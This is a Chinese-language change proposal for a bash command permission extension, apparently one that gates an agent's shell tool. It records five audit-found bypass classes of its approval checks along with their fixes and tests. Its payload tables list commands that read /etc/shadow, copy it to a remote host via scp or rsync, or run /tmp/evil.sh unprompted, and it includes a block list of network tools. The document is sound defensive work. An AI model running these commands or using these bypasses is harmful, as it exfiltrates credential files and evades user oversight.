# Bash Stage B: 封堵 bash-extract 与 bash-command grant 5 类漏洞

## Why

安全审计（本轮实测）发现 5 个可实际一行命令利用的权限绕过，其中 3 个正是 stage-a 归档 proposal 明确列为"留给 Stage B"的清单（`unknown command fail-open`、`shell-forwarder` 覆盖不全、`SILENT_COMMANDS` 过宽），另外 2 个是本轮新发现（`<` 输入重定向完全不提取、bash-command persistent grant 命中后绕过 unread hard-deny）。stage-a 只修了 4 类降噪豁免的过宽判定，未推翻 spec.md 里三处"已知风险"设计——本 change 就是回滚那三处已知风险，把静默通过改成显式弹窗。

5 类 payload 全部通过 `node --experimental-strip-types` 直接调 `extractBashTargets` / `findSensitiveMatch` 实测验证：

| # | 类别 | Payload | 当前结果 |
|---|---|---|---|
| C1 | SILENT_COMMANDS 过宽 | `npm run build` / `git log /etc/passwd` / `rg pattern /etc/shadow` / `jq . /etc/shadow` / `make -f /tmp/evil.mk` / `cargo run --manifest-path /tmp/x/Cargo.toml` | `OK W=[] R=[] D=[]` 静默 |
| C2 | 未列入任何表 | `sed -i 'x' /etc/passwd` / `python3 -c 'open("/etc/evil","w")'` / `node -e 'require("fs")...'` / `perl -e 'open(...)'` / `osascript -e 'do shell script ...'` / `scp /etc/shadow host:/tmp/` / `ssh user@host 'cat /etc/shadow'` / `rsync -a /etc/ host:/tmp/` | `OK W=[] R=[] D=[]` 静默 |
| C3 | shell-forwarder 覆盖不全 | `bash /tmp/evil.sh` / `bash -x /tmp/evil.sh` / `source /tmp/x.sh` / `. /tmp/x.sh` | `OK W=[] R=[] D=[]` 静默 |
| C4 | `<` 输入重定向 | `bash < /tmp/evil.sh` / `bash < /etc/passwd` / `diff < /etc/passwd < /etc/hosts` / `awk '{print}' < /etc/shadow` | `OK W=[] R=[] D=[]` 静默 |
| C5 | bash-command grant vs unread | 用户先对 `bash -c "cat /etc/passwd"` 点 Always allow → 之后配置 `{"/etc/passwd": "unread"}` → 再执行仍静默放行 | `undefined`（auto-allow）绕过 unread |

**Why now**：stage-a 归档 proposal 结尾明确写"不修的漏洞（留给 Stage B）"——本 change 是对 stage-a 已承诺的 Stage B 兑现。C4/C5 属于本轮审计新发现，与 stage-a 承诺的 Stage B 范围正交但语义同源（bash-extract 的静默通过面 / bash-command grant 的授权优先级），合并到本 change 一次收干净比拆两批更节省 proposal/apply/archive 循环开销。

## What Changes

- **MODIFIED** `bash-target-extraction` — "静默命令白名单" requirement：`SILENT_COMMANDS` 收窄到"无位置参数的纯只读子命令"（`git status/log/diff/branch/tag/remote/config` + `npm test/lint/build/audit` 等 package.json scripts），`git`/`npm`/`npx`/`yarn`/`pnpm`/`make`/`tsc`/`go`/`cargo`/`openspec`/`rg`/`jq` 等命令**作为命令名本身**不再命中 SILENT；带位置参数（如 `git log /etc/passwd`、`npm run`）或不在纯只读子命令白名单内的形式，一律判 `reliable: false, reason: "unreliable_command"`。回滚 spec.md 现有声明的"副作用被约束在项目 worktree 内"这一已知风险设计。
- **ADDED** `bash-target-extraction` — "不可执行命令守卫 UNRELIABLE_COMMANDS" requirement：新增 `UNRELIABLE_COMMANDS` 集合（`sed`/`perl`/`python`/`python2`/`python3`/`node`/`nodejs`/`ruby`/`osascript`/`scp`/`rsync`/`ssh`/`telnet`/`nc`/`netcat`/`ncat`/`avconv`/`ffmpeg`/`curl`-外的其他网络工具/`kubectl`/`docker`/`podman`/`eval`/`exec`/`trap`），命令名精确匹配即判 `reliable: false, reason: "unreliable_command"`。命令名既不在 `COMMAND_TABLE`、又不在收窄后的 `SILENT_COMMANDS`、又不在 `UNRELIABLE_COMMANDS` 的未知命令仍走既有 fail-open 默认（本 change 不改这个默认——留待下一轮决策，属于 D6 已知设计边界）。
- **MODIFIED** `bash-target-extraction` — "Shell 转发器守卫" requirement：把"bash/sh/dash/zsh + `-c` 才触发"扩展为"bash/sh/dash/zsh + 非 flag 位置参数（脚本路径）也触发"；同时把 `source` 与 `.`（dot-source）加入守卫。回滚 spec.md 现有 scenario "`bash /tmp/x.sh` 不触发 shell_forwarder"——这是明确写死的反例，本 change 删除该反例并新增正向 scenario。
- **MODIFIED** `bash-target-extraction` — "支持的重定向" requirement：`extractRedirects` 除既有的 `>`/`>>`/`2>`/`2>>`/`>&` 外，新增 `<` 输入重定向分支，将目标路径作为 read target 提取；覆盖 `bash < /tmp/evil.sh`、`diff < /etc/passwd < /etc/hosts`、`awk '{print}' < /etc/shadow` 等场景。
- **ADDED** `grant-memory` — "bash-command grant 与 unread 的优先级" requirement：bash-command session/persistent grant 命中后 MUST 仍扫描命令字符串里可识别的裸路径 token（引号外的绝对路径、`~/...` 展开后路径）跑 `policy.resolve()` 的 unread hard-deny 检查；任一命中 → 走 unread 硬拒绝路径，不走 grant auto-allow。这条契约同时约束 session 和 persistent grant 通道。

**BREAKING**（用户视角）：以下命令从"静默通过"变为"弹窗"——用户如果确实想跑，可以选择 "Always allow"（对 tier=three 场景）持久化到 `trusted.json`，或添加显式 config 声明覆盖。合法用例（`git status`、`npm test`、`git log --oneline` 等收窄后 SILENT 白名单内的形式）行为不变。

## Capabilities

### New Capabilities

（无——本 change 只修改既有 capability 的 requirement）

### Modified Capabilities

- `bash-target-extraction`：
  - MODIFIED "静默命令白名单" — SILENT_COMMANDS 收窄到纯只读子命令白名单
  - ADDED "不可执行命令守卫" — 新增 UNRELIABLE_COMMANDS 集合
  - MODIFIED "Shell 转发器守卫" — 覆盖"bash + 脚本路径"和 source/dot-source
  - MODIFIED "支持的重定向" — 增加 `<` 输入重定向提取
- `grant-memory`：
  - ADDED "bash-command grant 与 unread 的优先级" — grant 命中后仍跑 unread 检查

## Impact

**Modified code**

- `src/lib/bash-extract.ts`：
  - `SILENT_COMMANDS`：从命令名集合改为"命令名 + 子命令白名单"结构（`{ git: new Set(["status","log","diff","branch","tag","remote","config"]), npm: new Set(["test","lint","build","audit"]) }`）——命令名单独出现（`git`、`npm`）不再命中；`git status`、`npm test` 等组合命中收窄后的 SILENT
  - 新增 `UNRELIABLE_COMMANDS` 常量（Set of string）
  - `isShellForwarder`：扩展识别"shell + 非 flag 位置参数"和 `source` / `.`
  - `extractRedirects`：新增 `<` 分支（作为 read target 提取）
  - `extractBashTargets` 主流程：在既有 unreliable 判定链中插入 `UNRELIABLE_COMMANDS` 检查
- `extensions/index.ts`：
  - `handleBash` L453-472 分支：grant 命中后仍调用 `extractBashTargets`（可能返回 `reliable: false`——本分支只对 unreliable 命令 grant 生效，所以此处需要额外扫裸路径 token）+ 对提取到的路径跑 `state.policy.resolve()` 的 unread 检查
- **不动**：`src/lib/decision.ts`、`config.ts`、`trust.ts`、`sensitive.ts`、`path-utils.ts`、`audit.ts`
- **新增 `reason` 值：`unreliable_command`**（仅覆盖 UNRELIABLE_COMMANDS 命中的场景）；C5 通过既有 unread hard_deny 路径返回 `block`，不需要新 reason
- `extractBashTargets` 返回值形状不变
- 净增代码约 ~300 行（bash-extract.ts ~220 行 + extensions/index.ts ~80 行）

**Added tests**

- `test/bash-extract.test.ts` 追加 ~30 条测试（BT-B1..BT-B30）：C1 的 6 条 SILENT 收窄验证 + C2 的 8 条 UNRELIABLE_COMMANDS 命中验证 + C3 的 6 条 shell-forwarder 扩展验证 + C4 的 5 条 `<` 重定向验证 + 合法用例回归 ~5 条
- `extensions/index.test.ts` 追加 ~4 条测试（SYS-B1..SYS-B4）：C5 的 grant 与 unread 优先级验证（session grant + unread、persistent grant + unread、多 target 部分 unread、grant 命中但无 unread 仍 auto-allow）
- `test/security-probe.mjs` 追加 5 条原始审计 payload 作为独立探针（非 test suite 一部分）

**User-facing changes**

- 静默通过变弹窗（tier=two，无持久化选项；用户如需持久化只能添加显式 config）：
  - C1：`npm run <script>` / `git log /etc/passwd` / `rg pattern /etc/shadow` / `jq . /etc/shadow` / `make -f /tmp/evil.mk` / `cargo run --manifest-path /tmp/x/Cargo.toml`
  - C2：`sed -i 'x' /etc/passwd` / `python3 -c '...'` / `node -e '...'` / `perl -e '...'` / `osascript -e '...'` / `scp /etc/shadow host:/tmp/` / `ssh user@host '...'` / `rsync -a /etc/ host:/tmp/`
  - C3：`bash /tmp/evil.sh` / `source /tmp/x.sh` / `. /tmp/x.sh`
  - C4：`bash < /tmp/evil.sh` / `diff < /etc/passwd < /etc/hosts` / `awk '{print}' < /etc/shadow`
- 静默保持：`git status`、`git log --oneline -n 10`、`npm test`、`find . -name "*.ts"`、`echo hi > /dev/null`、`xargs grep pattern` 等合法用例
- C5：用户之前对某 bash 命令点过 "Always allow" 但之后该命令访问的路径被配置为 unread → 现在弹窗 tier=three（unread 冲突提示）；这是**授权撤回**——README 需要更新说明

**Audit & Docs**

- `reason` 字段值域新增 `unreliable_command`——已归档 audit log 不回填
- README 更新：
  - "Silent commands" 章节：改述收窄后的白名单
  - 新增 "Unreliable commands" 章节（UNRELIABLE_COMMANDS）
  - "Unreliable constructs" 列表增加 shell + 脚本路径、source、`<` 输入重定向
  - "Prompt tiers" 或 "Grant memory" 章节：明确 bash-command grant 命中后 unread 仍优先（配置变更可撤回 bash 授权）

## 系统工程影响评估

- **影响哪些分系统**：
  - `side-effects`（`src/lib/bash-extract.ts`）——C1/C2/C3/C4 全部改动都在这个纯函数模块内
  - `extension-orchestration`（`extensions/index.ts`）——C5 的 grant 命中后 unread 检查
  - `policy-core`（`src/lib/config.ts` 的 `policy.resolve()`）——C5 调用 `policy.resolve()` 但不改这个模块本身
  - `grant-memory` 契约（`trusted.json` 的 bash-command 通道）——C5 修改 grant 与 unread 的优先级语义，属于 grant-memory 公共契约变更
  - `policy-core` / `approval-flow` / `audit` 均不变

- **整体性能预期变化**：安全水位**定向收窄**——5 类原本静默通过的高危命令形态（SILENT 越界读写、未列名命令任意执行、shell 脚本执行、`<` 输入重定向、grant 覆盖 unread）改为显式弹窗。合法用例（收窄后 SILENT 白名单内的 `git status`/`npm test`/`git log --oneline`、既有降噪豁免如 `/dev/null`、`find -name`、`xargs grep`、for-loop 豁免）行为零回归。

- **这是局部优化还是全局协调**：**全局协调**——同时改 side-effects 分系统（C1/C2/C3/C4）和 extension-orchestration 分系统（C5），且 C5 修改 grant-memory 的公共契约（bash-command grant 的语义从"覆盖配置"变为"不覆盖 unread"）。这不是纯分系统内部重构，是分系统间契约调整。

- **如果是局部优化，对全局失调的风险**（不适用——本 change 是全局协调）：**N/A**。

- **预期行为模型**（可测量、技术无关、用户视角、可验证）：

  | 输入 | 期望输出 |
  |---|---|
  | `npm run build` | 用户看到 tier=two 弹窗，命令不静默通过 |
  | `git log /etc/passwd` | 用户看到 tier=two 弹窗 |
  | `sed -i 'x' /etc/passwd` | 用户看到 tier=two 弹窗 |
  | `python3 -c 'open("/etc/evil","w")'` | 用户看到 tier=two 弹窗 |
  | `scp /etc/shadow host:/tmp/` | 用户看到 tier=two 弹窗 |
  | `bash /tmp/evil.sh` | 用户看到 tier=two 弹窗 |
  | `source /tmp/x.sh` | 用户看到 tier=two 弹窗 |
  | `bash < /tmp/evil.sh` | 用户看到 tier=two 弹窗（`<` 输入重定向被提取为 read target，走正常决策路径） |
  | `diff < /etc/passwd < /etc/hosts` | 用户看到 tier=two 弹窗（两个 read target 被提取） |
  | bash grant 命中 + 命令访问 unread 路径 | 用户看到 unread 硬拒绝弹窗（`conflict_prompt` audit 事件），grant 不生效 |
  | bash grant 命中 + 命令无 unread 路径 | 命令静默执行（grant 生效） |
  | `git status`、`npm test`、`git log --oneline -n 10` | 用户看不到弹窗（合法用例回归） |
  | `find . -name "*.ts"`、`echo hi > /dev/null`、`xargs grep pattern` | 用户看不到弹窗（既有降噪豁免回归） |

  验证方式：30 条 bash-extract 测试 + 4 条 index 测试 + `test/security-probe.mjs` 5 条 payload 全部通过；`node --experimental-strip-types --test test/` 全测试套件零回归。

- **与既有架构/风格的遵循关系**：
  - 完全遵循：新增 `UNRELIABLE_COMMANDS` 沿用 `FORWARDING_COMMANDS`、`CONTROL_FLOW_KEYWORDS` 的 `Set<string>` 常量风格
  - 完全遵循：C5 通过 `policy.resolve()` 复用既有 unread 检查逻辑，不新增分系统
  - 完全遵循：`extractBashTargets` 返回值形状不变，caller（`extensions/index.ts`）无需适配
  - 完全遵循：`reason` 字段值域扩展遵循 stage-a 的 `find_write_flag` 扩展先例（stage-a 归档复盘明确承认这是"必要的 spec 值域扩展"）
  - **偏离**：`SILENT_COMMANDS` 从 `Set<string>` 命令名集合改为 `{ cmdName: Set<subcommand> }` 结构化白名单——**触发 human-in-loop 场景 1（公共契约变更）**。理由：命令名单独匹配无法区分 `git status`（安全）与 `git log /etc/passwd`（越界），必须能识别子命令；这个结构变更影响 `isForBodyReadOnly` 与 `extractBashTargets` 主流程的 `SILENT_COMMANDS.has(cmdName)` 调用点。已在 explore 阶段用户明确拍板（Q2 选择"收窄到纯只读子命令"）
  - **偏离**：C5 修改 grant-memory 的 bash-command grant 公共契约语义——**触发 human-in-loop 场景 1（公共契约变更）**。理由：unread 是 spec.md 声明的"硬拒绝、不可覆盖"，grant 命中绕过 unread 违反该契约。已在 explore 阶段用户明确拍板（Q4 选择"grant 命中后仍扫命令里的裸路径跑 unread 检查"）

## caller impact 分析

- **变更点清单**：
  1. `SILENT_COMMANDS` 从 `Set<string>` 改为 `Record<string, Set<string>>`——**属 ① 类**（公共符号，虽然当前是文件内常量、不导出，但语义是"所有调用点共享的白名单"，接口形状变化），**高危标记**
  2. 新增 `UNRELIABLE_COMMANDS` 常量（新增，无高危）
  3. `isShellForwarder` 内部逻辑扩展（非导出，无签名变化）——**属 ② 类**，非高危
  4. `extractRedirects` 内部逻辑扩展（非导出，无签名变化）——**属 ② 类**，非高危
  5. `handleBash` 内部逻辑变化（`extensions/index.ts`，函数不导出）——**属 ③ 类**（分系统内部行为契约），非高危
  6. 新增 `reason` 值 `unreliable_command`——**属 ③ 类**（返回值形状不变，只是新增枚举值），非高危
- **高危标记**：① `SILENT_COMMANDS` 形状变更——**决策：不属公共契约（模块内常量），但需要完整 caller 搜索确认所有 `SILENT_COMMANDS.has()` 调用点都适配**
- **已知 caller**：
  - `isForBodyReadOnly`（`bash-extract.ts` L1821-1841）：使用 `SILENT_COMMANDS.has(cmdName)`——预判**需适配**（改为判断"cmdName + 第一子命令 ∈ 白名单"）
  - `extractBashTargets` 主流程（`bash-extract.ts` L2141）：`SILENT_COMMANDS.has(cmdName)` 分支——预判**需适配**（同样判断子命令白名单）
  - `extensions/index.ts:448`：使用 `extractBashTargets` 返回值，形状不变——预判**兼容**
  - `test/bash-extract.test.ts`：既有 1726 行测试，SILENT_COMMANDS 相关测试（BMG、BT-*）大多断言"某命令 reliable 或 unreliable"，不断言 SILENT 结构——预判**部分需更新**（收窄后部分静默命令变弹窗，对应测试需要更新期望）

## scenario→test 覆盖账本

| # | Scenario | 测试函数名 | 备注 |
|---|---|---|---|
| BT-B1 | `npm run build` 判 unreliable | `npm_run_script_is_unreliable` | C1 |
| BT-B2 | `git log /etc/passwd` 判 unreliable | `git_log_with_path_is_unreliable` | C1 |
| BT-B3 | `rg pattern /etc/shadow` 判 unreliable | `rg_with_path_is_unreliable` | C1 |
| BT-B4 | `jq . /etc/shadow` 判 unreliable | `jq_with_path_is_unreliable` | C1 |
| BT-B5 | `make -f /tmp/evil.mk` 判 unreliable | `make_with_f_flag_is_unreliable` | C1 |
| BT-B6 | `cargo run --manifest-path /tmp/x/Cargo.toml` 判 unreliable | `cargo_run_manifest_path_is_unreliable` | C1 |
| BT-B7 | `sed -i 'x' /etc/passwd` 判 unreliable | `sed_in_place_is_unreliable` | C2 |
| BT-B8 | `python3 -c '...'` 判 unreliable | `python_inline_is_unreliable` | C2 |
| BT-B9 | `node -e '...'` 判 unreliable | `node_inline_is_unreliable` | C2 |
| BT-B10 | `perl -e '...'` 判 unreliable | `perl_inline_is_unreliable` | C2 |
| BT-B11 | `osascript -e '...'` 判 unreliable | `osascript_is_unreliable` | C2 |
| BT-B12 | `scp /etc/shadow host:/tmp/` 判 unreliable | `scp_is_unreliable` | C2 |
| BT-B13 | `ssh user@host '...'` 判 unreliable | `ssh_is_unreliable` | C2 |
| BT-B14 | `rsync -a /etc/ host:/tmp/` 判 unreliable | `rsync_is_unreliable` | C2 |
| BT-B15 | `bash /tmp/evil.sh` 判 shell_forwarder | `bash_with_script_path_is_shell_forwarder` | C3 |
| BT-B16 | `bash -x /tmp/evil.sh` 判 shell_forwarder | `bash_with_flag_and_script_path_is_shell_forwarder` | C3 |
| BT-B17 | `source /tmp/x.sh` 判 shell_forwarder | `source_script_is_shell_forwarder` | C3 |
| BT-B18 | `. /tmp/x.sh` 判 shell_forwarder | `dot_source_script_is_shell_forwarder` | C3 |
| BT-B19 | `bash < /tmp/evil.sh` 提取 read target | `bash_with_input_redirect_extracts_read_target` | C4 |
| BT-B20 | `diff < /etc/passwd < /etc/hosts` 提取 2 个 read target | `diff_with_two_input_redirects_extracts_two_read_targets` | C4 |
| BT-B21 | `awk '{print}' < /etc/shadow` 提取 read target | `awk_with_input_redirect_extracts_read_target` | C4 |
| BT-B22 | `bash -c '...'` 仍判 shell_forwarder（既有回归） | `bash_c_still_is_shell_forwarder` | 回归 |
| BT-B23 | `git status` 仍 reliable（收窄后 SILENT 保留） | `git_status_still_reliable` | 回归 |
| BT-B24 | `npm test` 仍 reliable | `npm_test_still_reliable` | 回归 |
| BT-B25 | `git log --oneline -n 10` 仍 reliable | `git_log_no_args_still_reliable` | 回归 |
| BT-B26 | `git status \| xargs rm` 仍判 forwarding_command | `git_status_with_xargs_rm_still_forwarding_command` | 既有行为保留 |
| BT-B27 | `find . -name "*.ts"` 仍 reliable | `find_name_only_still_reliable` | 既有降噪豁免回归 |
| BT-B28 | `echo hi > /dev/null` 仍可靠豁免 | `echo_to_dev_null_still_reliable` | 既有降噪豁免回归 |
| BT-B29 | `xargs grep pattern < files.txt` 仍可靠 | `xargs_grep_with_input_still_reliable` | 既有降噪豁免回归 + C4 `<` 交互 |
| BT-B30 | SILENT 命令 + `xargs` 守卫仍生效（`npm test \| xargs rm`） | `npm_test_with_xargs_rm_still_forwarding_command` | 回归 |

**总计**：30 条新增测试（BT-B1..BT-B30），覆盖：
- C1 SILENT 收窄：6 条正例 + 3 条回归（BT-B1..BT-B6、BT-B23..BT-B25）
- C2 UNRELIABLE_COMMANDS：8 条（BT-B7..BT-B14）
- C3 shell-forwarder 扩展：4 条正例 + 1 条既有回归（BT-B15..BT-B18、BT-B22）
- C4 `<` 输入重定向：3 条正例 + 1 条交互回归（BT-B19..BT-B21、BT-B29）
- 交叉/集成回归：2 条（BT-B26、BT-B30）
- 既有降噪豁免回归：2 条（BT-B27、BT-B28）

**回归面**：既有 326+ 测试套件必须零回归（除因收窄 SILENT 而需要更新期望的用例——具体列表由 apply 阶段跑测试后确认）。重点回归组：
- BMG1-BMG14（控制流）
- BMG24-BMG32（fd-redirect）
- BMG52-BMG63（bounded glob）
- BMG70-BMG74（forwarding_command）
- BMG83-BMG86（for-loop）
- BT-extra fd-redirect 组
- BT-S1..BT-S20（stage-a 新增）

## Scenario→test 覆盖账本（C5 grant-memory）

| # | Scenario | 测试函数名 | 备注 |
|---|---|---|---|
| SYS-B1 | bash session grant 命中 + 命令访问 unread 路径 → unread 硬拒绝 | `bash_session_grant_does_not_override_unread` | C5 |
| SYS-B2 | bash persistent grant 命中 + 命令访问 unread 路径 → unread 硬拒绝 | `bash_persistent_grant_does_not_override_unread` | C5 |
| SYS-B3 | bash grant 命中 + 命令无 unread 路径 → grant 仍生效 | `bash_grant_still_auto_allows_when_no_unread` | 回归 |
| SYS-B4 | bash grant 命中 + 命令部分访问 unread（多 target） → 全部 unread | `bash_grant_partial_unread_targets_still_denied` | C5 边界 |

**总计**：4 条新增测试，覆盖 C5 主路径 + 回归 + 边界。

**回归面**：既有 `test/backlog-regression.test.ts`（SYS9/SYS10/SYS11）与 `extensions/index.test.ts` 的 bash grant 相关测试（BGM-*）必须零回归。

## 实际系统工程影响 vs 预期

（td-archive 步骤 3 强制复盘。本复盘为 2026-10-27 system-audit project（18:37）a1 延伸后补写——早期归档时缺此节。）

- **实际影响的分系统**：`bash-target-extraction`（C1-C4：SILENT 收窄 + UNRELIABLE_COMMANDS + shell 转发器扩展 + `<` 重定向）+ `grant-memory`（C5：grant-unread 优先级）——与预期一致
- **实际整体性能变化**：安全水位定向收窄——与预期一致（5 类高危命令形态改为显式弹窗；合法用例零回归）
- **实际是局部优化还是全局协调**：全局协调（同时改 bash-target-extraction + grant-memory 契约）——与预期一致
- **局部优化的实际全局影响**：高危命令不再静默通过；grant 不覆盖 unread（配置契约优先）——与预期一致
- **模型验证**：
  1. **SILENT 收窄** ✅ 已验证——`npm run build` / `git log /etc/passwd` / `sed -i` / `python3 -c` / `scp` → tier=two 弹窗（30 条 bash-extract 测试）
  2. **shell 转发器扩展** ✅ 已验证——`bash /tmp/evil.sh` / `source /tmp/x.sh` → tier=two 弹窗
  3. **`<` 输入重定向** ✅ 已验证——`bash < /tmp/evil.sh` / `diff < a < b` → read target 提取
  4. **grant-unread 优先级** ✅ 已验证——SYS-B1/B2（grant 不覆盖 unread）+ SYS-B3（无 unread 时 grant 生效）+ SYS-B4（多 target 边界）
  5. **合法用例回归** ✅ 已验证——`git status` / `npm test` / `git log --oneline` / `/dev/null` / `find -name` 无弹窗
  - **预期行为模型已验证**（5/5）

- **预期之外的副作用**：无。C5 触发 human-in-loop 场景 1（grant-memory 公共契约变更）与 SILENT 结构变更——均在 explore 阶段用户拍板（Q2/Q4）。
